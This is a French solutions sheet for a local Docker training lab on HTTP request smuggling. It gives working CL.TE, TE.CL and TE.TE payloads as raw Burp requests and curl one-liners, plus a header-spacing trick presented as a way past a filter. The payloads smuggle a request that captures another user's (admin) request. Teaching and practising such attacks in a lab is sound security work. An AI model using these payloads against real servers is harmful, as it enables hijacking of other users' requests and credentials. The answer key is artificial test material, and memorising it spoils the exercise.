# Solutions du Lab Request Smuggling - Édition CyberSentinel (Mode Architecture Unique)

Ce document contient les solutions pour les 3 challenges. 
**IMPORTANT :** Ce lab fonctionne maintenant en mode "Challenge Unique". Vous devez configurer le challenge actif dans `docker-compose.yml`.

## Comment changer de Challenge
1. Ouvrez `docker-compose.yml`.
2. Modifiez la variable d'environnement `CHALLENGE_MODE` dans le service `frontend` :
   - `CHALLENGE_MODE=CL.TE` (pour le challenge 1)
   - `CHALLENGE_MODE=TE.CL` (pour le challenge 2)
   - `CHALLENGE_MODE=TE.TE` (pour le challenge 3)
3. Appliquez le changement : `docker compose up --build`.

## Prérequis Généraux
- Port cible : **localhost:3000** (pour tous les challenges).
- Port Backend (interne/Host header) : **localhost:8888**.
- Le paramètre `threat_data` doit être laissé ouvert en fin de body.

---

## Challenge 1 : CL.TE (Mode : CL.TE)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=CL.TE`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 139

0

POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 1500

threat_data=
```

**Exploit (Python - Recommandé pour Windows) :**

```bash
python exploit_cl_te.py
```

**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**

```bash
# Note: La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
# Utilisez Git Bash, WSL, ou le script Python ci-dessus
curl -i -s -X POST http://localhost:3000 \
-H "Transfer-Encoding: chunked" \
-H "Content-Length: 139" \
--data-binary $'0\r\n\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data='
```

---

## Challenge 2 : TE.CL (Mode : TE.CL)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=TE.CL`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

86
POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 1500

threat_data=
0


```

**Exploit (Python - Recommandé pour Windows) :**

```bash
python exploit_te_cl.py
```

**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**

```bash
# Note: La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
# Utilisez Git Bash, WSL, ou le script Python ci-dessus
curl -i -s -X POST http://localhost:3000 \
-H "Content-Length: 4" \
-H "Transfer-Encoding: chunked" \
--data-binary $'86\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data=\r\n0\r\n\r\n'
```

---

## Challenge 3 : TE.TE (Mode : TE.TE)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=TE.TE`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding : chunked
Content-Length: 139

0

POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 1500

threat_data=
```

**Exploit (Python - Recommandé pour Windows) :**

```bash
python exploit_te_te.py
```

**Exploit (Curl - Nécessite bash/zsh ou WSL sur Windows) :**

```bash
# Note: L'espace avant le deux-points dans "Transfer-Encoding : chunked" permet de bypasser le filtre
# La syntaxe $'...' ne fonctionne PAS sur PowerShell Windows
# Utilisez Git Bash, WSL, ou le script Python ci-dessus
curl -i -s -X POST http://localhost:3000 \
-H "Transfer-Encoding : chunked" \
-H "Content-Length: 139" \
--data-binary $'0\r\n\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data='
```

## Vérification
1. Envoyez la requête d'exploit.
2. Accédez au dashboard : `http://localhost:3000/ids/dashboard`.
3. Vous devriez voir la requête de l'admin capturée.
